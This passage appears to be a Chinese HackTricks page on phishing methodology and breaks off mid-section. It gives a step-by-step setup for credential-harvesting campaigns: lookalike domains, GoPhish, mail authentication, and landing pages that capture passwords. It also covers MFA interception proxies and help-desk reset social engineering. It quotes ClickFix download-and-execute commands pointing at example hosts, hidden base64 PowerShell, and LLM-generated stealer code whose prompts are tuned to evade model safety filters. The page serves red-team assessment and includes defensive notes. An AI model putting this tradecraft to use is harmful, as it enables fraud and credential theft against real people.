# 钓鱼方法论

{{#include ../../banners/hacktricks-training.md}}

## 方法论

1. 侦察目标
   1. 选择**目标域名**。
   2. 执行一些基础 Web 枚举，**查找目标使用的登录门户**，并**决定**要**冒充**哪一个。
   3. 使用一些 **OSINT** 手段来**查找电子邮件地址**。
2. 准备环境
   1. **购买域名**，用于钓鱼评估
   2. **配置邮件服务**相关记录（SPF、DMARC、DKIM、rDNS）
   3. 在 VPS 上配置 **gophish**
3. 准备活动
   1. 准备**电子邮件模板**
   2. 准备用于窃取凭据的**网页**
4. 发起活动！

## 生成相似域名或购买可信域名

### 域名变体技术

- **关键词**：域名中**包含**原始域名的重要**关键词**（例如，zelster.com-management.com）。<sup>[[1]](#references)</sup>
- **连字符子域名**：将子域名中的**点替换为连字符**（例如，www-zelster.com）。
- **新 TLD**：使用相同域名，但采用**新的 TLD**（例如，zelster.org）
- **同形异义字符**：将域名中的一个字母**替换为外观相似的字母**（例如，zelfser.com）。


{{#ref}}
homograph-attacks.md
{{#endref}}
- **字母换位：**在域名中**交换两个字母**（例如，zelsetr.com）。
- **单复数变化**：在域名末尾添加或删除“s”（例如，zeltsers.com）。
- **省略**：从域名中**删除一个字母**（例如，zelser.com）。
- **重复：**在域名中**重复一个字母**（例如，zeltsser.com）。
- **替换**：与同形异义字符类似，但不那么隐蔽。替换域名中的一个字母，例如使用键盘上靠近原字母的字母（例如，zektser.com）。
- **插入子域名**：在域名中插入一个**点**（例如，ze.lster.com）。
- **插入**：在域名中**插入一个字母**（例如，zerltser.com）。
- **缺少点**：将 TLD 附加到域名后面（例如，zelstercom.com）

**自动化工具**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**网站**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### 位翻转

由于太阳耀斑、宇宙射线或硬件错误等各种因素，存储或通信中的某些位**可能会自动翻转**。

将这一概念**应用于 DNS 请求时**，DNS 服务器**收到的域名**可能与最初请求的域名不同。

例如，域名“windows.com”中的一个位发生变化，就可能使其变成“windnws.com”。

攻击者可能会**利用这一点，注册多个与目标域名相似的位翻转域名**。他们的目的是将合法用户重定向到自己的基础设施。

更多信息请阅读 [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)。<sup>[[10]](#references)[[11]](#references)</sup>

### 购买可信域名

你可以在 [https://www.expireddomains.net/](https://www.expireddomains.net) 搜索可供使用的过期域名。\
为了确保你准备购买的过期域名**已经具有良好的 SEO**，可以查询它在以下网站中的分类：

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## 查找电子邮件地址

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester)（100% 免费）
- [https://phonebook.cz/](https://phonebook.cz)（100% 免费）
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

为了**发现更多**有效的电子邮件地址，或**验证已发现的地址**，你可以检查是否能对目标的 SMTP 服务器进行暴力破解。[在此了解如何验证/查找电子邮件地址](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration)。\
此外，别忘了，如果用户使用**任何 Web 门户访问邮件**，你可以检查该门户是否容易受到**用户名暴力破解**攻击，并在可能的情况下利用此漏洞。

## 配置 GoPhish

### 安装

你可以从 [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0) 下载。

下载后，将其解压到 `/opt/gophish`，并执行 `/opt/gophish/gophish`。\
输出中会显示 admin 用户在端口 3333 上使用的密码。因此，访问该端口并使用这些凭据更改 admin 密码。你可能需要将该端口隧道转发到本地：

```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```

### 配置

**TLS 证书配置**

在此步骤之前，你应该**已经购买了**要使用的**域名**，并且该域名必须**指向**你配置 **gophish** 的 **VPS 的 IP**。

```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```

**邮件配置**

开始安装：`apt-get install postfix`

然后将域名添加到以下文件中：

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**同时修改 /etc/postfix/main.cf 中以下变量的值**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

最后，将 **`/etc/hostname`** 和 **`/etc/mailname`** 文件修改为你的域名，然后**重启 VPS。**

现在，创建一条 **DNS A 记录**，将 `mail.<domain>` 指向 VPS 的 **IP 地址**，并创建一条指向 `mail.<domain>` 的 **DNS MX 记录**。

现在来测试发送邮件：

```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```

**Gophish 配置**

停止运行 gophish，然后进行配置。\
将 `/opt/gophish/config.json` 修改为以下内容（注意使用 https）：

```bash
{
        "admin_server": {
                "listen_url": "127.0.0.1:3333",
                "use_tls": true,
                "cert_path": "gophish_admin.crt",
                "key_path": "gophish_admin.key"
        },
        "phish_server": {
                "listen_url": "0.0.0.0:443",
                "use_tls": true,
                "cert_path": "/opt/gophish/ssl_keys/key.crt",
                "key_path": "/opt/gophish/ssl_keys/key.pem"
        },
        "db_name": "sqlite3",
        "db_path": "gophish.db",
        "migrations_prefix": "db/db_",
        "contact_address": "",
        "logging": {
                "filename": "",
                "level": ""
        }
}
```

**配置 gophish 服务**

要创建 gophish 服务，使其能够自动启动并作为服务进行管理，可以创建文件 `/etc/init.d/gophish`，并写入以下内容：

```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
    echo 'Starting '${processName}'...'
    cd ${appDirectory}
    nohup ./$process >>$logfile 2>>$errfile &
    sleep 1
}

stop() {
    echo 'Stopping '${processName}'...'
    pid=$(/bin/pidof ${process})
    kill ${pid}
    sleep 1
}

status() {
    pid=$(/bin/pidof ${process})
    if [["$pid" != ""| "$pid" != "" ]]; then
        echo ${processName}' is running...'
    else
        echo ${processName}' is not running...'
    fi
}

case $1 in
    start|stop|status) "$1" ;;
esac
```

完成服务配置并进行检查，执行：

```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```

## 配置邮件服务器和域名

### 等待并保持正规

域名越老，被判定为垃圾邮件的可能性就越低。因此，在进行 phishing assessment 之前，应尽可能多等待一段时间（至少 1 周）。此外，如果你放置一个关于信誉良好的行业的页面，获得的信誉会更好。

请注意，即使你需要等待一周，现在也可以完成所有配置。

### 配置反向 DNS（rDNS）记录

设置一条 rDNS（PTR）记录，将 VPS 的 IP 地址解析到域名。

### Sender Policy Framework (SPF) 记录

你必须**为新域名配置 SPF 记录**。如果你不知道 SPF 记录是什么，[**请阅读此页面**](../../network-services-pentesting/pentesting-smtp/index.html#spf)。

你可以使用 [https://www.spfwizard.net/](https://www.spfwizard.net) 生成 SPF policy（使用 VPS 机器的 IP）

![用于为 phishing 域名生成 SPF 记录的 SPF Wizard 表单](<../../images/image (1037).png>)

以下内容必须设置在域名中的 TXT 记录内：

```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```

### 基于域名的消息身份验证、报告与一致性 (DMARC) 记录

你必须**为新域名配置 DMARC 记录**。如果你不知道什么是 DMARC 记录，[**请阅读此页面**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc)。

你需要创建一个新的 DNS TXT 记录，将主机名 `_dmarc.<domain>` 指向以下内容：

```bash
v=DMARC1; p=none
```

### DomainKeys Identified Mail (DKIM)

你必须**为新域名配置 DKIM**。如果你不知道什么是 DKIM 记录，请[**阅读此页面**](../../network-services-pentesting/pentesting-smtp/index.html#dkim)。

本教程基于：[https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)。<sup>[[5]](#references)</sup>

> [!TIP]
> 你需要将 DKIM key 生成的两个 B64 值拼接起来：
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### 测试你的电子邮件配置评分

你可以使用 [https://www.mail-tester.com/](https://www.mail-tester.com)\
只需访问该页面，并向他们提供的地址发送一封电子邮件：

```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```

你也可以通过向 `check-auth@verifier.port25.com` 发送邮件并**读取回复**来**检查你的邮件配置**（为此，你需要**开放**端口 **25**；如果你以 root 身份发送邮件，可以在文件 _/var/mail/root_ 中查看回复）。\
检查你是否通过了所有测试：

```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```

你也可以向自己控制的 Gmail 账户发送**邮件**，并在 Gmail 收件箱中检查**邮件头**，`Authentication-Results` 头字段中应包含 `dkim=pass`。

```
Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
       dkim=pass header.i=@example.com;
```

### ​从 Spamhouse 黑名单中移除

[www.mail-tester.com](https://www.mail-tester.com) 页面可以告知你的域名是否被 Spamhouse 屏蔽。你可以在此申请将域名/IP 从黑名单中移除：​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### 从 Microsoft 黑名单中移除

​​你可以在 [https://sender.office.com/](https://sender.office.com) 申请将域名/IP 从黑名单中移除。

## 创建并启动 GoPhish Campaign

### 发送配置

- 设置一个用于**识别**发送配置的名称
- 决定要使用哪个账户发送钓鱼邮件。建议使用：_noreply、support、servicedesk、salesforce..._
- 用户名和密码可以留空，但请确保勾选“忽略证书错误”

![创建并启动 GoPhish Campaign - 发送配置：用户名和密码可以留空，但请确保勾选“忽略证书错误”](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> 建议使用“**发送测试邮件**”功能，测试一切是否正常。\
> 建议将测试邮件发送到 10min 邮箱地址，以免在测试时被列入黑名单。

### 邮件模板

- 设置一个用于**识别**模板的名称
- 然后填写**主题**（不要写得太奇怪，写一些你认为正常邮件中可能出现的内容即可）
- 确保已勾选“**添加跟踪图片**”
- 编写**邮件模板**（你可以像以下示例一样使用变量）：

```html
<html>
<head>
    <title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```

注意，**为了提高邮件的可信度**，建议使用一封来自客户的邮件中的签名。建议：

- 向一个**不存在的地址**发送邮件，检查回复中是否有签名。
- 搜索**公开邮箱**，例如 info@ex.com、press@ex.com 或 public@ex.com，向其发送邮件并等待回复。
- 尝试联系**已发现的有效邮箱**并等待回复

![发送配置 - 邮件模板：尝试联系已发现的有效邮箱并等待回复](<../../images/image (80).png>)

> [!TIP]
> 邮件模板还允许**附加要发送的文件**。如果你还想使用特制文件/文档窃取 NTLM challenge，请[阅读此页面](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)。

### Landing Page

- 填写一个**名称**
- **编写网页的 HTML 代码**。请注意，你可以**导入**网页。
- 勾选 **Capture Submitted Data** 和 **Capture Passwords**
- 设置**重定向**

![邮件模板 - Landing Page：勾选 Capture Submitted Data 和 Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> 通常，你需要修改页面的 HTML 代码，并在本地进行一些测试（也许可以使用 Apache 服务器），**直到效果满意为止。** 然后，将 HTML 代码填写到文本框中。\
> 请注意，如果需要为 HTML **使用一些静态资源**（例如 CSS 和 JS 页面），可以将它们保存到 _**/opt/gophish/static/endpoint**_，然后通过 _**/static/\<filename>**_ 访问。

> [!TIP]
> 对于重定向，你可以将用户**重定向到受害者的合法主页**，也可以将他们重定向到 _/static/migration.html_ 等页面，显示一个**旋转动画**（[**https://loading.io/**](https://loading.io)）持续 5 秒，然后提示**流程已成功**。

### 用户与群组

- 设置名称
- **导入数据**（请注意，要使用示例模板，需要每位用户的名字、姓氏和电子邮件地址）

![Landing Page - 用户与群组：导入数据（请注意，要使用示例模板，需要每位用户的名字、姓氏和电子邮件地址）](<../../images/image (163).png>)

### Campaign

最后，创建一个 campaign，选择名称、邮件模板、Landing Page、URL、发送配置和群组。请注意，URL 是发送给受害者的链接。

请注意，**发送配置允许发送测试邮件，以查看最终 phishing 邮件的效果**：

![用户与群组 - Campaign：请注意，发送配置允许发送测试邮件，以查看最终 phishing 邮件的效果](<../../images/image (192).png>)

一切准备就绪后，启动 campaign 即可！

## 网站克隆

如果你出于任何原因想要克隆网站，请查看以下页面：


{{#ref}}
clone-a-website.md
{{#endref}}

## 带后门的文档和文件

在一些 phishing 评估中（主要针对 Red Team），你可能还想**发送包含某种后门的文件**（可能是 C2，也可能只是会触发身份验证的内容）。\
以下页面提供了一些示例：


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### 通过代理 MitM

之前的攻击相当巧妙，因为你伪造了真实网站并收集用户输入的信息。遗憾的是，如果用户输入的密码不正确，或者你伪造的应用配置了 2FA，**这些信息就无法让你冒充被诱骗的用户**。

这时，[**evilginx2**](https://github.com/kgretzky/evilginx2)**、**[**CredSniper**](https://github.com/ustayready/CredSniper) 和 [**muraena**](https://github.com/muraenateam/muraena) 等工具就派上用场了。这些工具可以发起类似 MitM 的攻击。基本上，攻击过程如下：

1. 你**冒充真实网页的登录**表单。
2. 用户将其**凭据发送**到你的假页面，工具再将凭据发送到真实网页，**检查凭据是否有效**。
3. 如果账户配置了 **2FA**，MitM 页面会要求用户提供 2FA；用户输入后，工具会将其发送到真实网页。
4. 用户通过身份验证后，在工具执行 MitM 期间，你（作为攻击者）将**捕获凭据、2FA、cookie 以及用户交互中的所有信息**。

### 通过 VNC

如果不把**受害者引导到一个外观与原网站相同的恶意页面**，而是将其引导到一个**已连接真实网页的浏览器 VNC 会话**，会怎么样？你将能够看到他执行的操作，并窃取密码、使用的 MFA、cookie……\
你可以使用 [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) 来实现。<sup>[[3]](#references)[[4]](#references)</sup>

## 检测检测行为

显然，判断自己是否已经暴露的最佳方法之一，就是**在黑名单中搜索你的域名**。如果域名出现在列表中，说明它可能已被检测为可疑域名。\
检查域名是否出现在黑名单中的一个简单方法是使用 [https://malwareworld.com/](https://malwareworld.com)

不过，如下所述，还有其他方法可以判断受害者是否在**主动搜寻公开环境中的可疑 phishing 活动**：


{{#ref}}
detecting-phising.md
{{#endref}}

你可以**购买一个名称与受害者域名非常相似的域名**，和/或为你控制的域名的某个**子域名生成证书**，其中**包含**受害者域名的**关键词**。如果**受害者**与这些域名发生任何类型的 **DNS 或 HTTP 交互**，你就会知道**他正在主动搜寻**可疑域名，因此你需要非常隐蔽。<sup>[[2]](#references)</sup>

### 评估 phishing

使用 [**Phishious** ](https://github.com/Rices/Phishious)评估你的邮件是否会进入垃圾邮件文件夹、被拦截或成功送达。

## 高接触式身份劫持（服务台 MFA 重置）

现代入侵团伙越来越多地完全跳过邮件诱饵，**直接针对服务台/身份恢复流程**以绕过 MFA。此类攻击完全采用“living-off-the-land”方式：操作人员取得有效凭据后，便使用内置管理工具进行横向移动——无需恶意软件。<sup>[[6]](#references)</sup>

### 攻击流程
1. 对受害者进行侦察
   * 从 LinkedIn、数据泄露、公开的 GitHub 等来源收集个人和公司信息。
   * 找出高价值身份（高管、IT、财务人员），并查明密码/MFA 重置的**确切服务台流程**。
2. 实时社会工程
   * 冒充目标，通过电话、Teams 或聊天联系服务台（通常使用**伪造来电显示**或**克隆语音**）。
   * 提供先前收集的个人身份信息（PII），通过基于知识的验证。
   * 说服客服**重置 MFA 密钥**，或对已注册的手机号码执行 **SIM 换卡攻击**。
3. 获得访问权限后立即采取行动（真实案例中通常 ≤60 分钟）
   * 通过任意 Web SSO 门户建立立足点。
   * 使用内置工具枚举 AD / AzureAD（不落地二进制文件）：
     ```powershell
     # list directory groups & privileged roles
     Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

     # AzureAD / Graph – list directory roles
     Get-MgDirectoryRole | ft DisplayName,Id

     # Enumerate devices the account can login to
     Get-MgUserRegisteredDevice -UserId <user@corp.local>
     ```
   * 使用环境中已列入白名单的 **WMI**、**PsExec** 或合法 **RMM** agents 进行横向移动。

### 检测与缓解
* 将 help-desk 身份恢复视为**特权操作**——要求进行 step-up auth 并获得经理批准。
* 部署 **Identity Threat Detection & Response (ITDR)** / **UEBA** 规则，在以下情况发出警报：  
  * 更改 MFA 方法 + 从新设备 / 地理位置进行身份验证。  
  * 同一主体立即提权（user-→-admin）。
* 录下 help-desk 通话，并要求在重置前**回拨已登记的号码**。
* 实施 **Just-In-Time (JIT) / Privileged Access**，确保新重置的账户不会自动继承高权限 tokens。

---

## 大规模欺骗 – SEO Poisoning 与 “ClickFix” 活动
普通攻击团伙通过大规模攻击降低高接触式操作的成本，将**搜索引擎和广告网络变成投放渠道**。<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** 将 `chromium-update[.]site` 等虚假结果推到搜索广告的顶部。
2. 受害者下载一个小型**第一阶段 loader**（通常是 JS/HTA/ISO）。Unit 42 发现的示例：
   * `RedLine stealer`
   * `Lumma stealer`
   * `Lampion Trojan`
3. Loader 外传浏览器 cookies 和凭据数据库，然后拉取一个**静默 loader**，由它*实时*决定是否部署：
   * RAT（例如 AsyncRAT、RustDesk）
   * ransomware / wiper
   * persistence component（registry Run key + scheduled task）

### 加固建议
* 屏蔽新注册域名，并对*搜索广告*和电子邮件实施 **Advanced DNS / URL Filtering**。
* 将软件安装限制为已签名的 MSI / Store packages，并通过策略禁止执行 `HTA`、`ISO`、`VBS`。
* 监控浏览器打开安装程序时启动的子进程：
  ```yaml
  - parent_image: /Program Files/Google/Chrome/*
    and child_image: *\\*.exe
  ```
* 搜寻经常被 first-stage loaders 滥用的 LOLBins（例如 `regsvr32`、`curl`、`mshta`）。

### 通过 TDS handoff 劫持下载按钮点击
一些虚假软件下载门户会让可见的下载 `href` 指向**真实的** GitHub/release URL，却在 JavaScript 中劫持用户的**首次**交互，并将受害者引入 **Traffic Distribution System (TDS)** 链路。<sup>[[9]](#references)</sup>

```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
  if (!isEligibleClick(e.target)) return;
  cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
  e.stopImmediatePropagation();
  e.preventDefault();
}, true);
```

关键特征：
- Hook 通常在 `document` 上的 **捕获阶段**（`true`）运行，因此会先于网站处理程序触发。
- Chrome 通常使用 `mousedown` 而非 `click`，以便将重定向与有效的 **用户手势** 关联起来，并提高绕过弹窗拦截器的成功率。
- 某些变体会预先打开 `about:blank` 或合成 `<a target="_blank">` 点击，之后才设置 TDS URL。
- 浏览器端的限制通常保存在 `localStorage` 中，因此**首次点击**可能会跳转到恶意软件，而刷新或重试则会回退到看起来无害的可见链接。
- TDS 可以根据 referrer、入口域名、GEO、浏览器/设备指纹、VPN/数据中心检查、点击上下文和每会话计数器进行筛选，导致分析人员的重放结果不确定。

防御建议：
- 比较**显示的** `href` 与点击时生成的**实际**导航目标。
- 搜索这类处理程序：`document.addEventListener(..., true)`，在调用 `window.open`、`about:blank` 或合成锚点点击的同时，也调用 `preventDefault()` 和 `stopImmediatePropagation()`。
- 将一批新注册的软件下载安装到域名、且都加载同一个 CloudFront/JS 阶段，视为 SEO 投毒/TDS 模式的高置信度信号。

### 来自伪造验证页面的 ClickFix + 伪装成归档文件的 LOLBAS 下载
一些 TDS 分支最终会进入伪造的验证页面（Cloudflare/IUAM 风格），指示受害者运行一个受信任的 Windows 二进制文件，例如：<sup>[[9]](#references)</sup>

```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```

Notes:
- `mshta.exe` 会执行响应开头处的 **HTA/VBScript**，即使 URL 伪装成 `.7z` archive；追加的 archive 数据可以只是纯粹的诱饵。
- 后续阶段通常会继续伪装文件类型（用 `.rtf` 伪装 PowerShell、用 `.asar` 伪装 Python、在 ZIP 中填充二进制文件），然后转向 **manual PE mapping / in-memory execution**。
- 如果你正在响应此类攻击链，请从首次成功运行时就保留 **network + memory**：后续重放可能只会显示良性的 installer/SFX 流程，或者因 payload/key release 绑定到原始 TDS session 而失败。

### ClickFix DLL delivery tradecraft（伪造的 CERT 更新）
* 诱饵：克隆的国家 CERT 公告，其中有一个 **Update** 按钮，显示逐步的“修复”说明。攻击者诱导受害者运行一个 batch 文件，该文件会下载 DLL 并通过 `rundll32` 执行它。<sup>[[12]](#references)</sup>
* 观察到的典型 batch 攻击链：
  ```cmd
  echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
  echo timeout /t 10
  echo rundll32.exe "%TEMP%\notepad2.dll",notepad
  ```
  * `Invoke-WebRequest` 将 payload 写入 `%TEMP%`，短暂休眠以掩盖网络抖动，然后由 `rundll32` 调用导出的入口点（`notepad`）。
* DLL 会发送主机身份信息，并每隔几分钟轮询一次 C2。远程任务以 **base64 编码的 PowerShell** 形式到达，并在隐藏模式和绕过策略的情况下执行：
  ```powershell
  powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
  ```
  * 这保留了 C2 灵活性（服务器可以更换任务，而无需更新 DLL），并隐藏控制台窗口。查找 `rundll32.exe` 的 PowerShell 子进程，并确认是否同时使用了 `-WindowStyle Hidden`、`FromBase64String` 和 `Invoke-Expression`。
* 防御者可以查找以下形式的 HTTP(S) 回连：`...page.php?tynor=<COMPUTER>sss<USER>`，以及 DLL 加载后每隔 5 分钟轮询的行为。

---

## 通过 RTB 触发的展示广告恶意投放

与需要点击的赞助搜索结果不同，RTB 广告在其创意内容于网站或应用中渲染时，可以加载第三方 JavaScript。Citizen Lab 观察到广告标签会调用带有广告标识符的独立决策服务器。大多数展示请求收到的是空响应；被选中的请求则可能收到 JavaScript。因此，在重放过程中收到良性响应，并不能证明每位观看者都收到了相同内容。<sup>[[14]](#references)</sup>

这是一种**投放机制**，本身并不是漏洞利用：在广告渲染上下文中执行 JavaScript，并不会自动安装 spyware。底层浏览器或 OS 漏洞利用并未披露，因此单凭广告展示或决策服务器请求，不能证明发生了感染。关于 RTB 定向中的标识符关联问题，请参阅[威胁建模与身份隔离](../../privacy/threat-modeling-and-identity-separation.md)。<sup>[[14]](#references)</sup>

## AI 增强型 Phishing 操作
攻击者如今会串联使用 **LLM 和 voice-clone API**，制作完全个性化的诱饵并进行实时互动。

| 层级 | 威胁行为者的示例用途 |
|-------|-----------------------------|
|自动化|生成并发送超过 10 万封电子邮件 / SMS，使用随机措辞和跟踪链接。|
|生成式 AI|制作*一次性*电子邮件，提及公开的 M&A 信息、社交媒体上的内部笑话；在回拨诈骗中使用 deepfake CEO 声音。|
|Agentic AI|自主注册域名、抓取开源情报，并在受害者点击但未提交凭据时编写下一阶段邮件。|

**防御：**  
• 添加**动态横幅**，突出显示由不受信任的自动化发送的邮件（依据 ARC/DKIM 异常）。  
• 对高风险电话请求部署**语音生物识别验证短语**。  
• 在安全意识培训中持续模拟 AI 生成的诱饵——静态模板已经过时。

另请参阅——利用托管 agent 浏览器进行 agentic browsing 滥用以窃取凭据：

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

另请参阅——AI agent 滥用本地 CLI 工具和 MCP（用于 secrets 清点与检测）：

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM 辅助的 Phishing JavaScript 运行时组装（浏览器内代码生成）

攻击者可以投放看似无害的 HTML，并通过向**可信的 LLM API**请求 JavaScript，随后在浏览器中执行（例如使用 `eval` 或动态 `<script>`），从而**在运行时生成 stealer**。<sup>[[8]](#references)</sup>

1. **将提示词用作混淆手段：**在提示词中编码数据外传 URL/Base64 字符串；反复调整措辞，以绕过安全过滤器并减少幻觉。
2. **客户端 API 调用：**页面加载时，JS 调用公共 LLM（Gemini/DeepSeek 等）或 CDN 代理；静态 HTML 中只包含提示词/API 调用。
3. **组装并执行：**拼接响应并执行（每次访问生成多态内容）：

```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
  .then(r=>r.json())
  .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```

4. **钓鱼/数据外传：**生成的代码会个性化诱饵（例如解析 LogoKit token），并将凭据发送到提示词中隐藏的端点。

**规避特征**
- 流量会访问知名 LLM 域名或信誉良好的 CDN 代理；有时通过 WebSockets 连接到后端。
- 没有静态 payload；恶意 JS 只在渲染后存在。
- 非确定性生成会为每个会话生成**唯一**的窃取程序。

**检测思路**
- 启用 JS 运行沙箱；标记**由 LLM 响应内容触发的运行时 `eval`/动态脚本创建**。
- 搜寻前端向 LLM API 发送 POST 请求后，立即对返回文本调用 `eval`/`Function` 的行为。
- 对客户端流量中未经批准的 LLM 域名，以及随后发生的凭据 POST 请求发出警报。

---

## MFA 疲劳 / Push Bombing 变体 – 强制重置
除了传统的 push-bombing，攻击者还会在 help-desk 通话期间直接**强制重新注册 MFA**，使用户现有的 token 失效。之后出现的任何登录提示，在受害者看来都像是合法的。

```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```

监控 AzureAD/AWS/Okta 事件，查找来自同一 IP、在几分钟内发生的 **`deleteMFA` + `addMFA`**。

## Clipboard Hijacking / Pastejacking

攻击者可以从遭到入侵或使用 typosquatting 的网页中，悄悄将恶意命令复制到受害者的剪贴板，然后诱骗用户将其粘贴到 **Win + R**、**Win + X** 或终端窗口中，从而在没有任何下载或附件的情况下执行任意代码。


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution（Android 和 iOS）


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### 通过 QR 社交工程劫持 WhatsApp 设备关联
* 引诱页面（例如伪造的 ministry/CERT “频道”）会显示 WhatsApp Web/Desktop QR，并指示受害者扫描，从而悄悄将攻击者添加为**关联设备**。<sup>[[12]](#references)</sup>
* 攻击者会立即获得查看聊天和联系人的权限，直到会话被移除。受害者之后可能会看到“新设备已关联”通知；防御人员可以搜寻在访问不可信 QR 页面后不久发生的异常设备关联事件。

### 通过移动设备门控钓鱼来规避爬虫/沙箱
攻击者越来越多地在钓鱼流程前设置简单的设备检查，以确保桌面爬虫无法访问最终页面。一种常见模式是使用一小段脚本检查 DOM 是否支持触控，并将结果发送到服务器端点；非移动客户端会收到 HTTP 500（或空白页面），而移动用户则会看到完整流程。<sup>[[7]](#references)</sup>

最简客户端代码片段（典型逻辑）：

```html
<script src="/static/detect_device.js"></script>
```

`detect_device.js` 逻辑（简化版）：

```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
  .then(()=>location.reload());
```

常见的服务器行为：
- 首次加载时设置 session cookie。
